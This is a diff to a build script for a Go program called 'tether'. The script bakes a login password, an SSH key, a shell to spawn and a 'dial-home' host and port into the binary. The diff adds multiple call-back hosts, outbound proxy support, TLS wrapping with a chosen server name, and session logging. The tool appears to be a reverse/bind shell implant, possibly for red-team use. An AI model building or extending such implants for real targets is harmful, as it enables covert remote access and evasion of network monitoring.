@@ -7,12 +7,14 @@
 #   ./build.sh test            Build bin/tether-test with a known password + bundled key (local testing)
 #
 # Customise the baked-in defaults with env vars (all optional):
-#   PASS=secret        login password           (default: random 8 bytes; test build: testpass123)
-#   PUB="ssh-ed25519 ..."   authorized public key (default: none)
-#   SHELL_BIN=/bin/sh  shell to spawn            (default: /bin/bash)
-#   LHOST=10.0.0.1     dial-home host -> reverse scenario by default
-#   LPORT=443          listen/connect port       (default: 31337)
-#   BPORT=0            reverse bind port          (0 = any free port)
+#   PASS=secret        login password                    (default: random 8 bytes; test build: testpass123)
+#   PUB="ssh-ed25519 ..."   authorized public key        (default: none)
+#   SHELL_BIN=/bin/sh  shell to spawn                    (default: /bin/bash)
+#   LHOST=10.0.0.1     dial-home host(s), comma-sep      (default: none = bind mode)
+#   LPORT=443          listen/connect port                (default: 31337)
+#   BPORT=0            reverse bind port                  (0 = any free port)
+#   PROXY=socks5://... outbound proxy URL                 (default: env HTTPS_PROXY / ALL_PROXY)
+#   SNI=host.example   TLS server name; enables TLS wrap  (default: disabled)
 #
 # Examples:
 #   PASS=hunter2 ./build.sh
@@ -30,6 +32,9 @@ LD="-s -w -X 'main.localPassword=${PASS}'"
 [ -n "${LHOST:-}" ]     && LD="$LD -X 'main.LHOST=${LHOST}'"
 [ -n "${LPORT:-}" ]     && LD="$LD -X 'main.LPORT=${LPORT}'"
 [ -n "${BPORT:-}" ]     && LD="$LD -X 'main.HomeBindPort=${BPORT}'"
+[ -n "${SESSLOG:-}" ]   && LD="$LD -X 'main.SESSLOG=${SESSLOG}'"
+[ -n "${SNI:-}" ]       && LD="$LD -X 'main.SNI=${SNI}'"
+[ -n "${PROXY:-}" ]     && LD="$LD -X 'main.PROXY=${PROXY}'"
 
 build() { # os arch out [extra-ld]
 	local os="$1" arch="$2" out="$3" extra="${4:-}"
